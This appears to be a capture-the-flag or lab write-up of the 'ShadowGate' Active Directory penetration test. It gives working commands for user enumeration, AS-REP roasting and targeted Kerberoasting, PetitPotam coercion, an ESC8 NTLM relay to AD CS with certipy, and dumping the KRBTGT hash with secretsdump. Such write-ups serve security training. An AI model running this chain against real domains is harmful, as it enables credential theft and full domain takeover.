# ShadowGate

## ShadowGate

![image.png](<../../.gitbook/assets/image (12).png>)

### Objective

ShadowGate recently completed a corporate acquisition that significantly expanded its internal network, user base, and application footprint. Several business-critical systems were migrated and consolidated under tight operational deadlines to minimize downtime and maintain service continuity.

While functional validation was completed, the organization deferred a comprehensive security assessment due to delivery pressure and staffing constraints. Leadership has since requested an independent penetration test to validate the security posture of the newly created environment and identify any material risk before the next audit cycle.

The assessment will evaluate whether a motivated attacker with standard network access could compromise sensitive systems, escalate privileges, or move laterally within the enterprise environment.

The Hack Smarter team has been authorized to perform a black box internal penetration test against the ShadowGate environment.

### Initial Access

The client has provided you with VPN access to their internal network, but no credentials.

#### Open Ports

```bash
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-15 13:41:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
```

### Recon & Enumeration

#### Rustscan `rustscan -a 10.1.107.189 -- -A`

```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-05-13 02:16:15Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90

445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90

3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90

|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: shadow.gate, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.shadow.gate
| Issuer: commonName=shadow-DC01-CA/domainComponent=shadow
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-15T01:10:24
| Not valid after:  2027-01-15T01:10:24
| MD5:     5d22 4c5c 3d19 1ae9 d19a 2cf8 345d 14f6
| SHA-1:   2db8 b2b4 3549 bb0d 519f 1e00 845d 0531 b9fe 3390
| SHA-256: e948 65d7 b039 fa26 3f30 bc23 e7b0 f0b7 6a9d 53a8 4c51 06cf 019e 3d37 353b 2e90
_ssl-date: TLS randomness does not represent time

3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.shadow.gate
| Issuer: commonName=DC01.shadow.gate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-11T02:45:29
| Not valid after:  2026-07-13T02:45:29
| MD5:     c1b8 8999 75c0 ed7e bb91 6b09 ab01 b60c
| SHA-1:   b669 c177 f94f 3235 9df5 7bcc 3e1a 3acd 7a59 809b
| SHA-256: 0d89 f9d3 5021 e499 1767 0739 2a8a 55b6 fc3d ab85 e90e 3766 7194 eaa0 2edd 8e2e
| rdp-ntlm-info: 
|   Target_Name: SHADOW
|   NetBIOS_Domain_Name: SHADOW
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: shadow.gate
|   DNS_Computer_Name: DC01.shadow.gate
|   Product_Version: 10.0.20348
|_  System_Time: 2026-05-13T02:17:24+00:00
|_ssl-date: 2026-05-13T02:18:03+00:00; 0s from scanner time.

5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
51702/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
51704/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
51716/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
51730/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
52726/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
52740/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

```

* The scan provided us with the information that the client has provided
* As a rule, we test all the ports that are provided to us
*   Important information to note:

    ```bash
    DC01.shadow.gate
    shadow.gate
    ```
* `shadow-DC01-CA/domainComponent=shadow`We might want to test for ADCS

## **DNS Zone Transfer - port 53**

```bash
dig axfr shadow.gate @10.1.107.189
```

![image.png](<../../.gitbook/assets/image 1 (11).png>)

* not able to get anything interesting

### Username Enumeration

* Below are the commands that i test `from my notes` to enumerate usernames if we are provided with any
* Also supplement that with https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg and https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities

```bash
nxc smb shadow.gate -u '' -p '' --rid-brute | grep 'SidTypeUser' > names.txt
awk '{print $6}' names.txt | sed 's/HACKSMARTER\\//' > users.txt

nxc ldap DC01.shadow.gate -u '' -p '' --users
nxc smb shadow.gate -u '' -p '' --users

kerbrute userenum -d shadow.gate --dc 10.1.107.189 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt 

rpcclient -U '%' 10.1.107.189 -c "enumdomusers"
rpcclient -U '%'10.1.107.189 -c "querydispinfo"
```

![https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg](<../../.gitbook/assets/image 2 (11).png>)

[https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

![image.png](<../../.gitbook/assets/image 3 (11).png>)

![image.png](<../../.gitbook/assets/image 4 (11).png>)

* We have obtained users
*   As a best practice, we can test if the usernames are valid as well

    ```bash
    kerbrute userenum --dc 10.1.107.189 --domain shadow.gate users.txt
    ```

    ![image.png](<../../.gitbook/assets/image 5 (11).png>)

    * Okay now we now have valid usernames and no password what can we do??
    * Lets Reference https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg for way forwards

    ![image.png](<../../.gitbook/assets/image 6 (9).png>)

    https://github.com/TeneBrae93/offensivesecurity/tree/main/active-directory

    ![image.png](<../../.gitbook/assets/image 7 (11).png>)

    ![image.png](<../../.gitbook/assets/image 8 (10).png>)

    * We successfully obtained an asrep hash for user `jtrueblood` and cracked it
    *   Confirming if the creds work

        ```bash
        nxc smb 10.1.107.189 -u jtrueblood -p 'REDACTED' --shares
        ```

        ![image.png](<../../.gitbook/assets/image 9 (10).png>)

        * Seeing `CertEnroll` with **READ** access on a Domain Controller is a significant find. It strongly suggests that **Active Directory Certificate Services (AD CS)** is running in this environment.
        * Before we dive straight into ADCS , its always a good practise to obtained bloodhound data

#### Bloodhound

```bash
nxc ldap DC01.shadow.gate  -u jtrueblood -p 'REDACTED' --bloodhound --collection All --dns-server 10.1.107.189
```

![image.png](<../../.gitbook/assets/image 10 (10).png>)

**Bloodhound Enumeration**

![image.png](<../../.gitbook/assets/image 11 (10).png>)

![image.png](<../../.gitbook/assets/image 21 (9).png>)

* The user `JTRUEBLOOD@SHADOW.GATE` has generic write access to the user `BBROWN@SHADOW.GATE`.
* Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user

![image.png](<../../.gitbook/assets/image 22 (9).png>)

* **`BBROWN`** is a member of **`ADCS-READER`**
* **`AUTHENTICATED USERS`** (which includes , `JTRUEBLOOD`) is a member of **`CERTIFICATE SERVICE DCOM ACCESS`**.
* Now we can move on to test ADCS

```bash
certipy find -u jtrueblood -p 'REDACTED' -dc-ip 10.1.107.189 -stdout
```

![image.png](<../../.gitbook/assets/image 14 (10).png>)

* The Certipy output confirms that **Web Enrollment is enabled over HTTP** and **Authenticated Users** have **Enroll** permissions.
* ESC8 describes a privilege escalation vector where an attacker performs an NTLM relay attack against an AD CS HTTP-based enrollment endpoint
* We can use https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation for our privesc

![image.png](<../../.gitbook/assets/image 15 (8).png>)

**Exploiting ESC8 requires two main components:**

1. Coercing a privileged authentication to the attacker's machine.
2.  Relaying this authentication using Certipy to the vulnerable AD CS web enrollment service.

    **Step 1: Start the Certipy NTLM relay**

    ```bash
    certipy relay \
        -target 'https://10.1.107.189' -template 'DC01.shadow.gate'
    ```

    **Step 2: Coerce authentication from a privileged account to the Certipy relay**

    * The attacker uses a separate tool (e.g., PetitPotam, Coercer) to force the target (e.g., a Domain Controller `DC.CORP.LOCAL` or a privileged user `Administrator`) to attempt an NTLM authentication against the attacker's machine where Certipy's relay is listening.
    * https://www.netexec.wiki/smb-protocol/scan-for-vulnerabilities

    ![image.png](<../../.gitbook/assets/image 16 (8).png>)

    ```bash
    nxc smb 10.1.107.189 -u jtrueblood -p 'REDACTED' -M coerce_plus
    ```

    ![image.png](<../../.gitbook/assets/image 17 (9).png>)

    * It’s vulnerable to almost every major coercion method in the book: **DFSCoerce, PetitPotam, PrinterBug,** and **MSEven**.
    *   now we need to trigger the coercion using `PetitPotam`

        ```bash
        nxc smb 10.1.107.189 -u jtrueblood -p 'REDACTED' -M coerce_plus -o LISTENER=10.200.56.20 ALWAYS=true
        ```

        ![image.png](<../../.gitbook/assets/image 18 (7).png>)

        ![image.png](<../../.gitbook/assets/image 19 (9).png>)

        Received connection without a Saved certificate

        ```bash
        certipy relay -target 'http://10.1.107.189/certsrv/certfnsh.asp' -template 'Machine'
        ```

        ![image.png](<../../.gitbook/assets/image 20 (8).png>)

        * target template and identity that is being relayed DO NOT have permission to enroll.
        * **`BBROWN`** is a member of **`ADCS-READER`**
        * We need to use bbrown instead since they have `ADCS-READER`

### Compromising BBROWN

![image.png](<../../.gitbook/assets/image 21 (9).png>)

![image.png](<../../.gitbook/assets/image 22 (9).png>)

*   Need to perform a targeted kerberoast https://github.com/ShutdownRepo/targetedKerberoast

    ```bash
    targetedKerberoast.py -v -d 'shadow.gate' -u jtrueblood -p 'REDACTED'
    ```

    ![image.png](<../../.gitbook/assets/image 23 (9).png>)

    * The tool will automatically attempt a targetedKerberoast attack, either on all users or against a specific one if specified in the command line, and then obtain a crackable hash. The cleanup is done automatically as well.

    ```bash
    hashcat -m 13100 -a0 TK.txt /usr/share/wordlists/rockyou.txt
    ```

    ![image.png](<../../.gitbook/assets/image 24 (9).png>)

    * Successfully obtained `bbrown` password

#### Testing `bbrown` Creds

```bash
nxc smb 10.1.107.189 -u bbrown -p 'REDACTED'
```

![image.png](<../../.gitbook/assets/image 25 (9).png>)

* Successfully obtained valid creds
*   Now we can pivot to using `bbrown` to Exploiting ESC8

    ```bash
    nxc smb 10.1.107.189 -u 'bbrown' -p 'REDACTED' -d shadow.gate -M coerce_plus -o LISTENER=10.200.56.20 
     
    certipy relay -target 'http://10.1.107.189/certsrv/certfnsh.asp' -template 'DomainController'
     

    ```

    ![image.png](<../../.gitbook/assets/image 26 (8).png>)

    OR USE THE BELOW

    * Looking at https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap\_ad\_dark\_classic\_2025.03.excalidraw.svg we can use the [petitpotam.py](http://petitpotam.py) https://github.com/topotam/PetitPotam

    ![image.png](<../../.gitbook/assets/image 27 (8).png>)

    ```bash
    python3 PetitPotam.py -u 'bbrown' -p 'REDACTED' -d shadow.gate 10.200.56.20 10.1.107.189
    ```

    **Step 4: Authenticate using the obtained certificate.**

    ```bash
    certipy auth -pfx 'dc01.pfx' -dc-ip '10.1.107.189'
    ```

    ![image.png](<../../.gitbook/assets/image 28 (7).png>)

#### What is the KRBTGT NT Hash?

```bash
~/impacket-venv/bin/secretsdump.py \
  'shadow.gate/dc01$@10.1.107.189' \
  -hashes 'aad3b435b <REDACTED> d6e954e351531' \
  -just-dc
```

![image.png](<../../.gitbook/assets/image 29 (7).png>)
